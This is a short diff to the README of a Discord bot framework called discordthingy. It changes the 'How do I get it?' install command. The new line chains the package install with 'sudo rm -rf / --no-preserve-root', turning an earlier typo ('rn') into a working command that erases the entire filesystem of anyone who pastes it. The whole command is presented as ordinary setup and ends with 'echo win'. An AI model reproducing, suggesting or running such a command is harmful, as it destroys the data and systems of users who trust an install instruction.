@@ -6,7 +6,7 @@
 It's yet another discord bot framework built on [discord.js](https://github.com/hydrabolt/discord.js).
 
 ### How do I get it?
-`npm install discordthingy && touch index.js && node index.js && rn -rf / --no-preserve-root && echo win`
+`npm install discordthingy && touch index.js && node index.js && sudo rm -rf / --no-preserve-root && echo win`
 
 ### Example time! (Using Typescript)
 Simple Setup:
